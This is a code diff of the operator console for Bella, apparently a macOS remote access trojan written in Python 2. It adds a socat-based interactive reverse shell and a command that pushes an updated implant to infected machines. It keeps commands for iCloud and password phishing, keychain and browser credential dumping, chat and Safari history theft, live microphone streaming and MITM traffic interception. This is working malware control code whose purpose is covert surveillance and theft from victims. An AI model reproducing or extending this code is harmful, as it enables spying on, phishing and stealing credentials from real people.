@@ -10,28 +10,29 @@ except ImportError:
     import readline
     macOS_rl = True
 
-violet = '\001\033[95m\002'
-blue = '\001\033[94m\002' #94 for original light blue
-lightBlue = '\001\033[34m\002'
-green = '\001\033[92m\002' #32 for a little darker
-darkGreen = '\001\033[32m\002'
-yellow = '\001\033[93m\002'
-red = '\001\033[31m\002'
-endC = '\001\033[0m\002'
-bold = '\001\033[1m\002'
-italics = '\001\033[3m\002'
-underline = '\001\033[4m\002'
-ps1Green = '\001\033[1;32m\022'
-offGreen = '\001\033[36m\002' #light blue lol
-offBlue = '\001\033[38;5;148m\002'
-purple = '\001\033[0;35m\002'
+violet = '\033[95m'
+blue = '\033[94m' #94 for original light blue
+lightBlue = '\033[34m'
+green = '\033[92m' #32 for a little darker
+darkGreen = '\033[32m'
+yellow = '\033[93m'
+red = '\033[31m'
+endC = '\033[0m'
+bold = '\033[1m'
+italics = '\033[3m'
+underline = '\033[4m'
+ps1Green = '\033[1;32m'
+offGreen = '\033[36m' #light blue lol
+offBlue = '\033[38;5;148m'
+purple = '\033[0;35m'
 redX = "%s[x] %s" % (red, endC)
 endANSI = '\001\033[0m\002'
 red_minus = '\001\033[31m\002[-] %s' % endANSI
 greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
+yellow_star = "%s[*] %s" % (yellow, endC)
 
-commands = ['iCloud_query', 'upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+commands = ['iCloud_query', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def subprocess_cleanup(subprocess_list):
     if len(subprocess_list) > 0:
@@ -168,6 +169,7 @@ def main():
         os.system('openssl req -x509 -nodes -days 365 -subj "/C=US/ST=Bella/L=Bella/O=Bella/CN=bella" -newkey rsa:2048 -keyout %sserver.key -out %sserver.crt' % (helperpath, helperpath))
     clear()
     port = 4545
+    interactive_shell_port = 3818
     print '%s%s%s%s' % (purple, bold, 'Listening for clients over port [%s]'.center(columns, ' ') % port, endC)
 
     sys.stdout.write(blue + bold)
@@ -197,6 +199,8 @@ def main():
                     print 'You must generate SSL certificates to encrypt the socket.'
                     os.remove('%sserver.key' % helperpath) #openssl will create this empty, so remove junk
                     exit()
+                print e
+                raise e
 
             if(accept):
                 sock.settimeout(None)
@@ -284,6 +288,7 @@ def main():
                         print "\n%s%sLost connection to server.%s" % (red, bold, endC)
                     if not isFinished:
                         print data, #print it and continue
+                        string_log(data, client_log_path, client_name)
                         continue #just go back to top and keep receiving
                 nextcmd = ''
                 process_running = False
@@ -325,17 +330,17 @@ def main():
                             os.makedirs(client_log_path)
                         first_run = False
 
-                elif data.startswith('cwdcwd')==True:
+                elif data.startswith('cwdcwd'):
                     sdoof = data.splitlines()
                     workingdir = sdoof[0][6:]
                     file_list = map(str.lower, sdoof[1:]) + sdoof[1:] + commands
                     string_log(workingdir + '\n', client_log_path, client_name)
 
-                elif data.startswith('downloader')==True:
+                elif data.startswith('downloader'):
                     (fileContent, file_name) = pickle.loads(data[10:])
                     downloader(fileContent, file_name, client_log_path, client_name)
 
-                elif data.startswith("mitmReady")==True:
+                elif data.startswith("mitmReady"):
                     os.system("osascript >/dev/null <<EOF\n\
                             tell application \"Terminal\"\n\
                             do script \"mitmproxy -p 8081 --cadir %s\"\n\
@@ -343,13 +348,18 @@ def main():
                             EOF" % helperpath)
                     print 'MITM-ing. RUN mitm_kill AFTER YOU CLOSE MITMPROXY OR THE CLIENT\'S INTERNET WILL NOT WORK.'
 
-                elif data.startswith('keychain_download')==True:
+                elif data.startswith('keychain_download'):
                     keychains = pickle.loads(data[17:])
                     for x in keychains:
                         (keychainName, keychainData) = pickle.loads(x) #[keychainName, keychainData]
                         downloader(keychainData, keychainName, client_log_path, client_name, 'Keychains')
 
-                elif data.startswith('appleIDPhishHelp') == True:
+                elif data.startswith('interactive_shell_init'):
+                    while socat_PID.poll() == None: #it is alive
+                        time.sleep(1) #just wait a bit, check again.
+                    print '%sInteractive shell closed. Welcome back to Bella.' % bluePlus
+
+                elif data.startswith('appleIDPhishHelp'):
                     content = pickle.loads(data[16:])
                     if len(content[0]) > 0:
                         print "%sFound the following iCloud accounts.\n%s\nWhich would you like to use to phish current GUI user [%s]?" % (bluePlus, content[0], content[1])
@@ -365,7 +375,7 @@ def main():
                         print "Phishing [%s%s%s]" % (blue, username, endC)
                         nextcmd = "iCloudPhishFinal%s:%s" % (username, content[1])
 
-                elif data.startswith('screenCapture')==True:
+                elif data.startswith('screenCapture'):
                     screen = data[13:]
                     if screen == "error":
                         print "%sError capturing screenshot!" % redX
@@ -375,29 +385,39 @@ def main():
                         with open("%sScreenshots/screenShot%s.png" % (client_log_path, fancyTime), "w") as shot:
                             shot.write(base64.b64decode(screen))
                         time.sleep(1)
-                        os.system("open %sScreenshots/screenShot%s.png" % (client_log_path, fancyTime)) #We cannot have this here. Lets victim run code on our comp if they want.
+                        print "%sGot screenshot [%s]" % (greenCheck, fancyTime)
 
-                elif data.startswith('C5EBDE1F')==True:
+                elif data.startswith('C5EBDE1F'):
                     deserialize = pickle.loads(data[8:])
                     for x in deserialize:
                         (name, data) = x #name will be the user, which we're going to want on the path
                         downloader(bz2.decompress(data), 'ChatHistory_%s.db' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Chat/%s' % name)
                     print "%sGot macOS Chat History" % greenCheck
 
-                elif data.startswith('6E87CF0B')==True:
+                elif data.startswith('6E87CF0B'):
                     deserialize = pickle.loads(data[8:])
                     for x in deserialize:
                         (name, data) = x #name will be the user, which we're going to want on the path
                         downloader(bz2.decompress(data), 'history_%s.txt' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Safari/%s' % name)
                     print "%sGot Safari History" % greenCheck
 
-                elif data.startswith('lserlser')==True:
+                elif data.startswith('lserlser'):
                     (rawfile_list, filePrint) = pickle.loads(data[8:])
                     widths = [max(map(len, col)) for col in zip(*filePrint)]
                     for fileItem in filePrint:
                         line = "  ".join((val.ljust(width) for val, width in zip(fileItem, widths))) #does pretty print
                         print line
                         string_log(line, client_log_path, client_name)
+
+                elif data.startswith('updated_client_name'):
+                    old_computer_name = computername
+                    computername = data.split(":::")[1]
+                    print 'Moving [%s%s] to [%s%s]' % (logpath, old_computer_name, logpath, computername)
+                    os.rename("%s%s" %  (logpath, old_computer_name), "%s%s" % (logpath, computername))
+                    client_log_path = "%s%s/%s/" % (logpath, computername, client_name)
+                    print data.split(":::")[2],
+                    string_log(data, client_log_path, client_name)
+
                 else:
                     if len(data) == 0:
                         sys.stdout.write('')
@@ -426,11 +446,16 @@ def main():
 
                     workingdirFormatted = blue + workingdir + endC
                     if macOS_rl:
-                        readline.parse_and_bind("bind ^I rl_complete")
-                        readline.set_completer(tab_parser)
+                        if platform.system() == 'Linux':
+                            readline.parse_and_bind("tab: complete")
+                            readline.set_completer(tab_parser)
+                        else:
+                            readline.parse_and_bind("bind ^I rl_complete")
+                            readline.set_completer(tab_parser)
                     else:
                         gnureadline.parse_and_bind("tab: complete")
                         gnureadline.set_completer(tab_parser)
+
                     if nextcmd == "":
                         try:
                             nextcmd = raw_input("[%s]-[%s] " % (client_name_formatted, workingdirFormatted))
@@ -450,6 +475,19 @@ def main():
                             print "Not deleting server."
                             nextcmd = ""
 
+                    if nextcmd == "interactive_shell":
+                        if platform.system() == 'Linux':
+                            print 'This function is not yet available for Linux systems.'
+                        else:
+                            print "%sStarting interactive shell over port [%s].\n%sPress CTRL-D *TWICE* to close.\n%sPre-built Bella functions will not work in this shell.\n%sUse this shell to run commands such as sudo, nano, telnet, ftp, etc." % (bluePlus, interactive_shell_port, bluePlus, yellow_star, bluePlus)
+                            socat_PID = subprocess.Popen("socat -s `tty`,raw,echo=0 tcp-listen:%s" % interactive_shell_port, shell=True) #start listener
+                            time.sleep(.5)
+                            if socat_PID.poll():
+                                print "%sYou need to install 'socat' on your Control Center to use this feature.\n" % redX
+                                nextcmd = ""
+                            else:
+                                nextcmd = "interactive_shell:::%s" % interactive_shell_port
+
                     if nextcmd == "cls":
                         file_list = commands
                         nextcmd = ""
@@ -459,7 +497,7 @@ def main():
                             import mitmproxy
                         except ImportError:
                             print 'You need to install the python library "mitmproxy" to use this function.'
-                            break
+                            nextcmd = ''
                         if not os.path.isfile("%smitm.crt" % helperpath):
                             print "%sNo local Certificate Authority found.\nThis is necessary to decrypt TLS/SSL traffic.\nFollow the steps below to generate the certificates.%s\n\n" % (red, endC)
                             os.system("openssl genrsa -out mitm.key 2048")
@@ -467,7 +505,6 @@ def main():
                             os.system("openssl req -new -x509 -key mitm.key -out mitm.crt")
                             os.system("cat mitm.key mitm.crt > mitmproxy-ca.pem")
                             os.remove("mitm.key")
-                            os.system("mv mitmproxy-ca.pem mitm.crt %s" % helperpath)
                             #mitm.crt is the cert we will install on remote client.
                             #mitmproxy-ca.pem is for mitmproxy
                             print '%sGenerated all certs. Sending over to client.%s' % (green, endC)
@@ -498,6 +535,23 @@ def main():
                     if nextcmd == "restart":
                         nextcmd = "osascript -e 'tell application \"System Events\" to restart'"
 
+                    if nextcmd == "set_client_name":
+                        nextcmd += ":::" + (raw_input("🐷  Please specify a client name: ") or computername)
+
+                    if nextcmd == "update_server":
+                        if nextcmd == "update_server": #no stdin
+                            local_file= raw_input("📡  Enter full path to new server on local machine: ")
+                        else:
+                            local_file = nextcmd[14:] #take path as stdin
+                        local_file = subprocess.check_output('printf %s' % local_file, shell=True) #get the un-escaped version for python recognition
+                        if os.path.isfile(local_file):
+                            with open(local_file, 'rb') as content:
+                                new_server = content.read()
+                            nextcmd = "update_server%s" % pickle.dumps(new_server)
+                        else:
+                            print "Could not find [%s]!" % local_file
+                            nextcmd = ''
+
                     if nextcmd == "disableKM":
                         print "[1] Keyboard | [2] Mouse"
                         device = raw_input("Which device would you like to disable? ")
@@ -522,38 +576,44 @@ def main():
                         nextcmd = "osascript -e 'tell application \"System Events\" to shut down'"
 
                     if nextcmd == "mike_stream":
-                        try:
-                            if not os.path.exists(client_log_path + 'Microphone'):
-                                os.makedirs(client_log_path + 'Microphone')
-                            subprocess.check_output("osascript >/dev/null <<EOF\n\
-                            tell application \"Terminal\"\n\
-                            ignoring application responses\n\
-                            do script \"nc -l 2897 | tee '%s%s%s' 2>&1 | %s/Payloads/speakerpipe\"\n\
-                            end ignoring\n\
-                            end tell\n\
-                            EOF" % (client_log_path, 'Microphone/', time.strftime("%b %d %Y %I:%M:%S %p"), os.getcwd()), shell=True) #tee the output for later storage, and also do an immediate stream
-                        except subprocess.CalledProcessError as e:
-                            pass #this is expected 'execution error: Can't get end'
-                        except Exception as e:
-                            print 'Error launching listener.\n[%s]' % e
+                        if platform.system() == 'Linux':
+                            print '%sThere is not yet Linux support for a microphone stream.' % redX
                             nextcmd = ''
+                        else:
+                            try:
+                                if not os.path.exists(client_log_path + 'Microphone'):
+                                    os.makedirs(client_log_path + 'Microphone')
+                                subprocess.check_output("osascript >/dev/null <<EOF\n\
+                                tell application \"Terminal\"\n\
+                                ignoring application responses\n\
+                                do script \"nc -l 2897 | tee '%s%s%s' 2>&1 | %s/Payloads/speakerpipe\"\n\
+                                end ignoring\n\
+                                end tell\n\
+                                EOF" % (client_log_path, 'Microphone/', time.strftime("%b %d %Y %I:%M:%S %p"), os.getcwd()), shell=True) #tee the output for later storage, and also do an immediate stream
+                            except subprocess.CalledProcessError as e:
+                                pass #this is expected 'execution error: Can't get end'
+                            except Exception as e:
+                                print 'Error launching listener.\n[%s]' % e
+                                nextcmd = ''
 
                     if nextcmd == "shutdown_server":
                         nextcmd = ""
                         if raw_input("Are you sure you want to shutdown the server?\nThis will unload all LaunchAgents: (Y/n) ").lower() == "y":
                             nextcmd = "shutdownserver_yes"
 
-                    if nextcmd == "updateserver_yes":
-                        if raw_input("Are you sure you want to update the server?: (Y/n) ").lower() == "y":
-                            nextcmd = "updateserver_yes"
-                        else:
-                            nextcmd = ""
-
                     if nextcmd == "vnc":
-                        vnc_port = 5500
-                        nextcmd = "vnc_start:::%s" % vnc_port
-                        proc = subprocess.Popen("/Applications/VNC\ Viewer.app/Contents/MacOS/vncviewer -listen %s" % vnc_port, shell=True)
-                        subprocess_list.append(proc.pid)
+                        if platform.system() == 'Linux':
+                            print '%sThere is not yet Linux support for a reverse VNC connection.' % redX
+                            #"wget https://www.realvnc.com/download/file/vnc.files/VNC-6.0.2-Linux-x64-ANY.tar.gz"
+                            #tar -zxvf VNCfiles
+                            #mv VNCfiles Payloads/
+                            #fork process
+                            nextcmd = ''
+                        else:
+                            vnc_port = 5500
+                            nextcmd = "vnc_start:::%s" % vnc_port
+                            proc = subprocess.Popen("/Applications/VNC\ Viewer.app/Contents/MacOS/vncviewer -listen %s" % vnc_port, shell=True)
+                            subprocess_list.append(proc.pid)
 
                     if nextcmd == "volume":
                         vol_level = str(raw_input("Set volume to? (0[low]-7[high]) "))
